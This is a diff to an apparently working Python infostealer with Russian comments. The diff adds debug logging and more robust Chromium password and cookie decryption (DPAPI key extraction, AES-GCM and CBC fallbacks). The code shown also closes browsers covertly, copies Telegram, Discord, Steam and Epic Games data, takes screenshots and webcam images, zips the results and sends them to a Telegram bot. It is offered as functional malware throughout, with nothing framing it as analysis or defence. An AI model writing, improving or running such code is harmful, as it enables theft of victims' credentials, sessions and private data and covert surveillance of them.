@@ -19,6 +19,7 @@ import cv2
 import sys
 from pathlib import Path
 from Cryptodome.Cipher import AES
+import traceback
 
 # Исправленный импорт для Windows-специфичных модулей
 if platform.system() == "Windows":
@@ -62,6 +63,18 @@ BROWSERS = {
     "amigo": "Amigo Browser",
     "edge": "Microsoft Edge"
 }
+
+# Глобальный логгер для отладки
+DEBUG_LOG = BASE_DIR / "debug.log"
+
+def debug_log(message):
+    """Записывает отладочные сообщения в файл"""
+    try:
+        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"[{timestamp}] {message}\n")
+    except Exception as e:
+        print(f"Ошибка записи в лог: {e}")
 
 # =============================================
 # ФУНКЦИИ ДЛЯ РАБОТЫ С FIREFOX COOKIES
@@ -129,11 +142,11 @@ def get_firefox_cookies():
                         'same_site': same_site
                     })
                 except Exception as e:
-                    print(f"Ошибка обработки куки Firefox: {e}")
+                    debug_log(f"Ошибка обработки куки Firefox: {e}")
                     continue
                     
         except Exception as e:
-            print(f"Ошибка доступа к базе куки Firefox: {e}")
+            debug_log(f"Ошибка доступа к базе куки Firefox: {e}")
         finally:
             conn.close()
             
@@ -151,7 +164,7 @@ def create_directories():
         COOKIE_DIR.mkdir(parents=True, exist_ok=True)
         PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
     except Exception as e:
-        print(f"!!! Критическая ошибка создания папок: {e}")
+        debug_log(f"!!! Критическая ошибка создания папок: {e}")
         try:
             os.makedirs(COOKIE_DIR, exist_ok=True)
             os.makedirs(PASSWORDS_DIR, exist_ok=True)
@@ -220,7 +233,7 @@ def stealthy_kill_browser(browser_name):
                     pass
         return True
     except Exception as e:
-        print(f"Ошибка при скрытном закрытии браузера: {e}")
+        debug_log(f"Ошибка при скрытном закрытии браузера: {e}")
         return False
 
 def capture_webcam():
@@ -270,7 +283,7 @@ def steal_steam_data():
                             shutil.copy2(str(src), str(dst))
                             stolen_data.append(str(rel_path))
             except Exception as e:
-                print(f"Ошибка при краже данных Steam: {e}")
+                debug_log(f"Ошибка при краже данных Steam: {e}")
     
     if stolen_data:
         with open(steam_dir / "file_list.json", "w") as f:
@@ -307,7 +320,7 @@ def steal_epic_games_data():
                             shutil.copy2(str(src), str(dst))
                             stolen_data.append(str(rel_path))
             except Exception as e:
-                print(f"Ошибка при краже данных Epic Games: {e}")
+                debug_log(f"Ошибка при краже данных Epic Games: {e}")
     
     if stolen_data:
         with open(epic_dir / "file_list.json", "w") as f:
@@ -344,7 +357,7 @@ def steal_telegram_data():
                             shutil.copy2(str(src), str(dst))
                             stolen_data.append(str(rel_path))
             except Exception as e:
-                print(f"Ошибка при краже данных Telegram: {e}")
+                debug_log(f"Ошибка при краже данных Telegram: {e}")
     
     if stolen_data:
         with open(telegram_dir / "file_list.json", "w") as f:
@@ -382,7 +395,7 @@ def steal_discord_data():
                             shutil.copy2(str(src), str(dst))
                             stolen_data.append(str(rel_path))
             except Exception as e:
-                print(f"Ошибка при краже данных Discord: {e}")
+                debug_log(f"Ошибка при краже данных Discord: {e}")
     
     if stolen_data:
         with open(discord_dir / "file_list.json", "w") as f:
@@ -390,34 +403,31 @@ def steal_discord_data():
 
 def get_encryption_key(profile_path):
     """Получает ключ шифрования с поиском Local State в родительской папке"""
+    debug_log(f"Поиск ключа для: {profile_path}")
+    
     if platform.system() != "Windows" or not HAS_WIN32CRYPT:
+        debug_log("Платформа не Windows или win32crypt недоступен")
         return None
     
-    # Поиск Local State в текущей и родительской папке
-    local_state_path = Path(profile_path) / "Local State"
-    if not local_state_path.exists():
-        parent_local_state = Path(profile_path).parent / "Local State"
-        if parent_local_state.exists():
-            local_state_path = parent_local_state
-        else:
-            # Попробуем найти в корне User Data
-            user_data_path = Path(profile_path).parent.parent / "Local State"
-            if user_data_path.exists():
-                local_state_path = user_data_path
-            else:
-                # Расширенный поиск для разных браузеров
-                possible_paths = [
-                    Path(profile_path).parent.parent / "Local State",
-                    Path(profile_path).parent.parent.parent / "Local State",
-                    Path(profile_path).parent.parent.parent.parent / "Local State"
-                ]
-                for path in possible_paths:
-                    if path.exists():
-                        local_state_path = path
-                        break
-                else:
-                    print(f"Файл Local State не найден: {profile_path}")
-                    return None
+    # Поиск Local State в возможных расположениях
+    possible_paths = [
+        Path(profile_path) / "Local State",
+        Path(profile_path).parent / "Local State",
+        Path(profile_path).parent.parent / "Local State",
+        Path(profile_path).parent.parent.parent / "Local State",
+        Path(profile_path).parent.parent.parent.parent / "Local State"
+    ]
+    
+    local_state_path = None
+    for path in possible_paths:
+        if path.exists():
+            local_state_path = path
+            debug_log(f"Найден Local State: {path}")
+            break
+    
+    if not local_state_path:
+        debug_log(f"Файл Local State не найден для: {profile_path}")
+        return None
     
     try:
         with open(local_state_path, 'r', encoding='utf-8') as f:
@@ -425,29 +435,39 @@ def get_encryption_key(profile_path):
         
         # Проверка наличия ключа os_crypt
         if "os_crypt" not in local_state:
-            print(f"Ключ 'os_crypt' не найден в {local_state_path}")
+            debug_log(f"Ключ 'os_crypt' не найден в {local_state_path}")
             return None
             
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        if len(encrypted_key) < 5:
+            debug_log(f"Некорректная длина ключа: {len(encrypted_key)} байт")
+            return None
+            
         encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
         try:
-            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            debug_log(f"Ключ успешно получен ({len(key)} байт)")
+            return key
         except Exception as e:
-            print(f"Ошибка в win32crypt.CryptUnprotectData: {e}")
+            debug_log(f"Ошибка в win32crypt.CryptUnprotectData: {e}")
             return None
     except Exception as e:
-        print(f"Ошибка получения ключа {profile_path}: {e}")
+        debug_log(f"Ошибка получения ключа {profile_path}: {e}")
         return None
 
 def decrypt_chromium_value(encrypted_value, key):
-    """Улучшенная расшифровка значений для Chromium с исправлением GCM"""
+    """Улучшенная расшифровка значений для Chromium с расширенной диагностикой"""
     try:
-        # Если значение пустое, сразу возвращаем пустую строку
+        debug_log(f"Начало дешифровки ({len(encrypted_value)} байт)")
+        
+        # Если значение пустое
         if not encrypted_value:
+            debug_log("Пустое значение")
             return ""
         
-        # Если это не байты, возвращаем как есть
+        # Если это не байты
         if not isinstance(encrypted_value, bytes):
+            debug_log("Не байтовое значение")
             return encrypted_value
         
         # Для Windows: попробовать DPAPI
@@ -456,31 +476,61 @@ def decrypt_chromium_value(encrypted_value, key):
                 decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                 if decrypted:
                     try:
-                        return decrypted.decode('utf-8')
+                        result = decrypted.decode('utf-8')
+                        debug_log("Успешная дешифровка через DPAPI")
+                        return result
                     except UnicodeDecodeError:
-                        return decrypted.decode('latin-1')
-            except:
-                pass
+                        result = decrypted.decode('latin-1')
+                        debug_log("Успешная дешифровка через DPAPI (latin-1)")
+                        return result
+            except Exception as e:
+                debug_log(f"Ошибка DPAPI: {str(e)}")
         
-        # Обработка AES-GCM (v10/v11) - КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ
+        # Проверка наличия ключа
+        if not key:
+            debug_log("Ключ дешифровки отсутствует")
+            return base64.b64encode(encrypted_value).decode('utf-8')
+        
+        # Обработка AES-GCM (v10/v11)
         if len(encrypted_value) > 15 and encrypted_value.startswith(b'v10'):
+            debug_log("Обнаружен формат v10 (AES-GCM)")
             try:
-                # Извлекаем nonce (12 байт после префикса v10)
                 nonce = encrypted_value[3:15]
-                ciphertext = encrypted_value[15:-16]  # Основной текст
-                tag = encrypted_value[-16:]  # Тег аутентификации
+                ciphertext = encrypted_value[15:-16]
+                tag = encrypted_value[-16:]
+                
+                debug_log(f"Данные GCM: nonce={len(nonce)} ciphertext={len(ciphertext)} tag={len(tag)}")
                 
                 cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                 plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                 
-                # Декодируем результат
-                return plaintext.decode('utf-8')
+                try:
+                    result = plaintext.decode('utf-8')
+                    debug_log("Успешная дешифровка GCM")
+                    return result
+                except UnicodeDecodeError:
+                    debug_log("Ошибка декодирования UTF-8 после GCM")
+                    return plaintext.decode('latin-1', errors='ignore')
             except Exception as e:
-                print(f"Ошибка GCM дешифровки: {str(e)[:100]}")
-                pass
+                debug_log(f"Ошибка GCM: {str(e)}")
+                # Попробовать без тега для старых версий
+                try:
+                    nonce = encrypted_value[3:15]
+                    ciphertext = encrypted_value[15:]
+                    
+                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                    plaintext = cipher.decrypt(ciphertext)
+                    
+                    try:
+                        return plaintext.decode('utf-8')
+                    except:
+                        return plaintext.decode('latin-1', errors='ignore')
+                except Exception as e2:
+                    debug_log(f"Ошибка GCM без тега: {str(e2)}")
         
         # Обработка AES-CBC (старые версии)
-        if key and len(encrypted_value) > 16:
+        if len(encrypted_value) > 16:
+            debug_log("Попытка дешифровки CBC")
             try:
                 # Для CBC используем первые 16 байт как IV
                 iv = encrypted_value[:16]
@@ -493,20 +543,15 @@ def decrypt_chromium_value(encrypted_value, key):
                 padding_length = plaintext[-1]
                 plaintext = plaintext[:-padding_length]
                 
-                return plaintext.decode('utf-8')
-            except:
-                pass
-        
-        # Для Linux/MacOS: AES-GCM без префикса
-        if key and len(encrypted_value) > 12:
-            try:
-                nonce = encrypted_value[:12]
-                ciphertext = encrypted_value[12:]
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                plaintext = cipher.decrypt(ciphertext)
-                return plaintext.decode('utf-8')
-            except:
-                pass
+                try:
+                    result = plaintext.decode('utf-8')
+                    debug_log("Успешная дешифровка CBC")
+                    return result
+                except UnicodeDecodeError:
+                    debug_log("Ошибка декодирования UTF-8 после CBC")
+                    return plaintext.decode('latin-1', errors='ignore')
+            except Exception as e:
+                debug_log(f"Ошибка CBC: {str(e)}")
         
         # Последняя попытка: DPAPI для Windows
         if platform.system() == "Windows" and HAS_WIN32CRYPT:
@@ -521,10 +566,11 @@ def decrypt_chromium_value(encrypted_value, key):
                 pass
         
         # Если ничего не сработало, вернуть как base64
+        debug_log("Все методы дешифровки не сработали, возвращаем base64")
         return base64.b64encode(encrypted_value).decode('utf-8')
             
     except Exception as e:
-        print(f"Критическая ошибка дешифровки: {str(e)[:100]}")
+        debug_log(f"КРИТИЧЕСКАЯ ОШИБКА ДЕШИФРОВКИ: {traceback.format_exc()}")
         try:
             return base64.b64encode(encrypted_value).decode('utf-8')
         except:
@@ -533,99 +579,145 @@ def decrypt_chromium_value(encrypted_value, key):
 def steal_chrome_passwords(browser_name, profile_path):
     """Крадет пароли из браузеров на основе Chromium"""
     try:
+        debug_log(f"Кража паролей для {browser_name} из {profile_path}")
         key = get_encryption_key(str(Path(profile_path).parent))
+        
+        if key:
+            debug_log(f"Получен ключ дешифровки ({len(key)} байт)")
+        else:
+            debug_log("Ключ дешифровки не найден")
+        
         login_db = os.path.join(profile_path, "Login Data")
         
         if not os.path.exists(login_db):
+            debug_log(f"Файл паролей не найден: {login_db}")
             return []
         
         # Создаем временную копию файла паролей
         temp_db = os.path.join(tempfile.gettempdir(), f"temp_pass_{browser_name}_{random.randint(1000,9999)}.db")
         shutil.copy2(login_db, temp_db)
+        debug_log(f"Создана временная копия: {temp_db}")
         
         passwords = []
-        conn = sqlite3.connect(temp_db)
-        conn.text_factory = bytes  # Для обработки бинарных данных
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        
-        for item in cursor.fetchall():
-            try:
-                url, username, password_value = item
-                decrypted_pass = decrypt_chromium_value(password_value, key)
-                if decrypted_pass:
-                    passwords.append({
-                        'url': url.decode('utf-8', errors='ignore') if isinstance(url, bytes) else url,
-                        'username': username.decode('utf-8', errors='ignore') if isinstance(username, bytes) else username,
-                        'password': decrypted_pass
-                    })
-            except Exception as e:
-                print(f"Ошибка обработки пароля: {e}")
-                continue
-        
-        conn.close()
         try:
-            os.remove(temp_db)
-        except:
-            pass
+            conn = sqlite3.connect(temp_db)
+            conn.text_factory = bytes
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
+            for i, item in enumerate(cursor.fetchall()):
+                try:
+                    url, username, password_value = item
+                    debug_log(f"Обработка пароля #{i+1}")
+                    
+                    # Логирование для диагностики
+                    debug_log(f"URL: {url[:50] if isinstance(url, bytes) else url}")
+                    debug_log(f"Username: {username[:50] if isinstance(username, bytes) else username}")
+                    debug_log(f"Password value: {password_value[:20] if isinstance(password_value, bytes) else password_value}...")
+                    
+                    decrypted_pass = decrypt_chromium_value(password_value, key)
+                    
+                    if decrypted_pass:
+                        debug_log("Пароль успешно дешифрован")
+                        passwords.append({
+                            'url': url.decode('utf-8', errors='ignore') if isinstance(url, bytes) else url,
+                            'username': username.decode('utf-8', errors='ignore') if isinstance(username, bytes) else username,
+                            'password': decrypted_pass
+                        })
+                except Exception as e:
+                    debug_log(f"Ошибка обработки пароля: {traceback.format_exc()}")
+                    continue
+        except Exception as e:
+            debug_log(f"Ошибка SQL: {traceback.format_exc()}")
+        finally:
+            try:
+                conn.close()
+                os.remove(temp_db)
+                debug_log("Временный файл паролей удален")
+            except:
+                pass
+        
+        debug_log(f"Найдено паролей: {len(passwords)}")
         return passwords
     except Exception as e:
-        print(f"Ошибка при краже паролей {browser_name}: {e}")
+        debug_log(f"Ошибка при краже паролей {browser_name}: {traceback.format_exc()}")
         return []
 
 def steal_chromium_cookies(browser_name, profile_path):
     """Крадет куки из браузеров на основе Chromium с 100% расшифровкой"""
     try:
+        debug_log(f"Кража куки для {browser_name} из {profile_path}")
         key = get_encryption_key(str(Path(profile_path).parent))
+        
+        if key:
+            debug_log(f"Получен ключ дешифровки ({len(key)} байт)")
+        else:
+            debug_log("Ключ дешифровки не найден")
+        
         cookie_db = os.path.join(profile_path, "Network", "Cookies")
         
         if not os.path.exists(cookie_db):
+            debug_log(f"Файл куки не найден: {cookie_db}")
             return []
         
         # Создаем временную копию файла куки
         temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db")
         shutil.copy2(cookie_db, temp_db)
+        debug_log(f"Создана временная копия: {temp_db}")
         
         cookies = []
-        conn = sqlite3.connect(temp_db)
-        conn.text_factory = bytes  # Для обработки бинарных данных
-        cursor = conn.cursor()
-        cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, encrypted_value FROM cookies")
-        
-        for item in cursor.fetchall():
-            try:
-                host, name, value, path, expires, secure, encrypted_value = item
-                
-                # Приоритет - encrypted_value
-                if encrypted_value and isinstance(encrypted_value, bytes):
-                    cookie_value = decrypt_chromium_value(encrypted_value, key)
-                else:
-                    # Если нет encrypted_value, используем обычное значение
-                    if isinstance(value, bytes):
-                        cookie_value = value.decode('utf-8', errors='ignore')
-                    else:
-                        cookie_value = value
-                
-                cookies.append({
-                    'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
-                    'name': name.decode('utf-8', errors='ignore') if isinstance(name, bytes) else name,
-                    'value': cookie_value,
-                    'path': path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else path,
-                    'expires': expires,
-                    'secure': bool(secure)
-                })
-            except Exception as e:
-                print(f"Ошибка обработки куки: {e}")
-                continue
-        
-        conn.close()
         try:
-            os.remove(temp_db)
-        except:
-            pass
+            conn = sqlite3.connect(temp_db)
+            conn.text_factory = bytes
+            cursor = conn.cursor()
+            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, encrypted_value FROM cookies")
+            
+            for i, item in enumerate(cursor.fetchall()):
+                try:
+                    host, name, value, path, expires, secure, encrypted_value = item
+                    debug_log(f"Обработка куки #{i+1}")
+                    
+                    # Логирование для диагностики
+                    debug_log(f"Host: {host[:50] if isinstance(host, bytes) else host}")
+                    debug_log(f"Name: {name[:50] if isinstance(name, bytes) else name}")
+                    debug_log(f"Value: {value[:20] if isinstance(value, bytes) else value}...")
+                    debug_log(f"Encrypted: {encrypted_value[:20] if isinstance(encrypted_value, bytes) else encrypted_value}...")
+                    
+                    # Приоритет - encrypted_value
+                    if encrypted_value and isinstance(encrypted_value, bytes):
+                        cookie_value = decrypt_chromium_value(encrypted_value, key)
+                    else:
+                        # Если нет encrypted_value, используем обычное значение
+                        if isinstance(value, bytes):
+                            cookie_value = value.decode('utf-8', errors='ignore')
+                        else:
+                            cookie_value = value
+                    
+                    cookies.append({
+                        'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
+                        'name': name.decode('utf-8', errors='ignore') if isinstance(name, bytes) else name,
+                        'value': cookie_value,
+                        'path': path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else path,
+                        'expires': expires,
+                        'secure': bool(secure)
+                    })
+                except Exception as e:
+                    debug_log(f"Ошибка обработки куки: {traceback.format_exc()}")
+                    continue
+        except Exception as e:
+            debug_log(f"Ошибка SQL: {traceback.format_exc()}")
+        finally:
+            try:
+                conn.close()
+                os.remove(temp_db)
+                debug_log("Временный файл куки удален")
+            except:
+                pass
+        
+        debug_log(f"Найдено куки: {len(cookies)}")
         return cookies
     except Exception as e:
-        print(f"Ошибка при краже куки {browser_name}: {e}")
+        debug_log(f"Ошибка при краже куки {browser_name}: {traceback.format_exc()}")
         return []
 
 def steal_passwords():
@@ -635,7 +727,7 @@ def steal_passwords():
         if not PASSWORDS_DIR.exists():
             PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
         
-        print(f"[Кража паролей] Папка для сохранения: {PASSWORDS_DIR}")
+        debug_log(f"[Кража паролей] Папка для сохранения: {PASSWORDS_DIR}")
         
         # Пути к профилям браузеров
         appdata = BROWSER_DATA_DIR
@@ -654,11 +746,11 @@ def steal_passwords():
                 passwords = []
                 
                 if browser_name == "firefox":
-                    print(f"Для браузера {display_name} пароли не поддерживаются")
+                    debug_log(f"Для браузера {display_name} пароли не поддерживаются")
                 elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
                     if path.exists():
-                        print(f"Обработка браузера: {display_name}")
+                        debug_log(f"Обработка браузера: {display_name}")
                         if platform.system() == "Windows":
                             stealthy_kill_browser(browser_name)
                             time.sleep(1)
@@ -669,14 +761,14 @@ def steal_passwords():
                     password_file = PASSWORDS_DIR / f"{display_name}_Passwords.json"
                     with open(password_file, 'w', encoding='utf-8') as f:
                         json.dump(passwords, f, indent=4, ensure_ascii=False)
-                        print(f"Пароли {display_name} сохранены: {len(passwords)} записей")
+                        debug_log(f"Пароли {display_name} сохранены: {len(passwords)} записей")
                 else:
-                    print(f"Для браузера {display_name} пароли не найдены")
+                    debug_log(f"Для браузера {display_name} пароли не найдены")
                         
             except Exception as e:
-                print(f"Общая ошибка при краже паролей {browser_name}: {e}")
+                debug_log(f"Общая ошибка при краже паролей {browser_name}: {traceback.format_exc()}")
     except Exception as e:
-        print(f"Критическая ошибка в steal_passwords: {e}")
+        debug_log(f"Критическая ошибка в steal_passwords: {traceback.format_exc()}")
 
 def steal_cookies():
     """Крадет куки из всех доступных браузеров"""
@@ -685,7 +777,7 @@ def steal_cookies():
         if not COOKIE_DIR.exists():
             COOKIE_DIR.mkdir(parents=True, exist_ok=True)
         
-        print(f"[Кража cookies] Папка для сохранения: {COOKIE_DIR}")
+        debug_log(f"[Кража cookies] Папка для сохранения: {COOKIE_DIR}")
         
         # Пути к профилям браузеров
         appdata = BROWSER_DATA_DIR
@@ -704,19 +796,19 @@ def steal_cookies():
                 cookies = []
                 
                 if browser_name == "firefox":
-                    print(f"Обработка браузера: {display_name}")
+                    debug_log(f"Обработка браузера: {display_name}")
                     try:
                         cookies = get_firefox_cookies()
                         if cookies:
-                            print(f"Куки Firefox успешно получены: {len(cookies)} записей")
+                            debug_log(f"Куки Firefox успешно получены: {len(cookies)} записей")
                         else:
-                            print(f"Для браузера Mozilla Firefox куки не найдены")
+                            debug_log(f"Для браузера Mozilla Firefox куки не найдены")
                     except Exception as e:
-                        print(f"Не удалось получить куки для Firefox: {e}")
+                        debug_log(f"Не удалось получить куки для Firefox: {traceback.format_exc()}")
                 elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
                     if path.exists():
-                        print(f"Обработка браузера: {display_name}")
+                        debug_log(f"Обработка браузера: {display_name}")
                         if platform.system() == "Windows":
                             stealthy_kill_browser(browser_name)
                             time.sleep(1)
@@ -727,14 +819,14 @@ def steal_cookies():
                     cookie_file = COOKIE_DIR / f"{display_name}_Cookies.json"
                     with open(cookie_file, 'w', encoding='utf-8') as f:
                         json.dump(cookies, f, indent=4, ensure_ascii=False)
-                        print(f"Куки {display_name} сохранены: {len(cookies)} записей")
+                        debug_log(f"Куки {display_name} сохранены: {len(cookies)} записей")
                 else:
-                    print(f"Для браузера {display_name} куки не найдены")
+                    debug_log(f"Для браузера {display_name} куки не найдены")
                         
             except Exception as e:
-                print(f"Общая ошибка при краже куки {browser_name}: {e}")
+                debug_log(f"Общая ошибка при краже куки {browser_name}: {traceback.format_exc()}")
     except Exception as e:
-        print(f"Критическая ошибка в steal_cookies: {e}")
+        debug_log(f"Критическая ошибка в steal_cookies: {traceback.format_exc()}")
 
 def get_ipinfo():
     """Получает информацию о IP"""
@@ -814,7 +906,7 @@ def take_screenshot():
         screenshot.save(str(SCREENSHOT_PATH), "JPEG", quality=90)
         return True
     except Exception as e:
-        print(f"Ошибка создания скриншота: {e}")
+        debug_log(f"Ошибка создания скриншота: {traceback.format_exc()}")
         return False
 
 def create_zip():
@@ -851,11 +943,12 @@ def create_zip():
                         arcname = marker_file.relative_to(BASE_DIR)
                         zipf.write(str(marker_file), str(arcname))
                     except Exception as e:
-                        print(f"Не удалось создать маркер для {folder}: {e}")
+                        debug_log(f"Не удалось создать маркер для {folder}: {e}")
             
+        debug_log(f"Архив создан: {zip_path}")
         return zip_path
     except Exception as e:
-        print(f"Ошибка создания архива: {e}")
+        debug_log(f"Ошибка создания архива: {traceback.format_exc()}")
         return None
 
 def send_to_telegram(zip_path):
@@ -924,9 +1017,10 @@ def send_to_telegram(zip_path):
                 caption="Полные данные системы, куки, пароли и данные приложений",
                 timeout=120
             )
+        debug_log("Данные успешно отправлены в Telegram")
         return True
     except Exception as e:
-        print(f"Ошибка отправки в Telegram: {e}")
+        debug_log(f"Ошибка отправки в Telegram: {traceback.format_exc()}")
         return False
 
 def cleanup():
@@ -952,37 +1046,40 @@ def cleanup():
 
 def main_workflow():
     """Основной рабочий процесс"""
-    # Гарантированное создание папок
-    create_directories()
-    
-    # Собираем системную информацию
-    sys_info = get_system_info()
-    with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
-        json.dump(sys_info, f, indent=4, ensure_ascii=False)
-    
-    # Крадем куки
-    steal_cookies()
-    
-    # Крадем пароли
-    steal_passwords()
-    
-    # Крадем данные приложений
-    steal_telegram_data()
-    steal_discord_data()
-    steal_steam_data()
-    steal_epic_games_data()
-    
-    # Скриншот
-    take_screenshot()
-    
-    # Снимок с веб-камеры
-    capture_webcam()
-    
-    # Упаковываем и отправляем
-    zip_file = create_zip()
-    
-    if zip_file:
-        send_to_telegram(zip_file)
+    try:
+        # Гарантированное создание папок
+        create_directories()
+        
+        # Собираем системную информацию
+        sys_info = get_system_info()
+        with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
+            json.dump(sys_info, f, indent=4, ensure_ascii=False)
+        
+        # Крадем куки
+        steal_cookies()
+        
+        # Крадем пароли
+        steal_passwords()
+        
+        # Крадем данные приложений
+        steal_telegram_data()
+        steal_discord_data()
+        steal_steam_data()
+        steal_epic_games_data()
+        
+        # Скриншот
+        take_screenshot()
+        
+        # Снимок с веб-камеры
+        capture_webcam()
+        
+        # Упаковываем и отправляем
+        zip_file = create_zip()
+        
+        if zip_file:
+            send_to_telegram(zip_file)
+    except Exception as e:
+        debug_log(f"Критическая ошибка в основном потоке: {traceback.format_exc()}")
 
 
 if __name__ == "__main__":
@@ -998,11 +1095,11 @@ if __name__ == "__main__":
     
     try:
         main_workflow()
-        print("[+] Готово")
+        debug_log("[+] Готово")
     except Exception as e:
-        print(f"!!! Критическая ошибка: {e}")
+        debug_log(f"!!! Критическая ошибка: {traceback.format_exc()}")
         try:
-            bot.send_message(TELEGRAM_CHAT_ID, f"Критическая ошибка: {str(e)}")
+            bot.send_message(TELEGRAM_CHAT_ID, f"Критическая ошибка: {str(e)[:1000]}")
         except:
             pass
     finally:
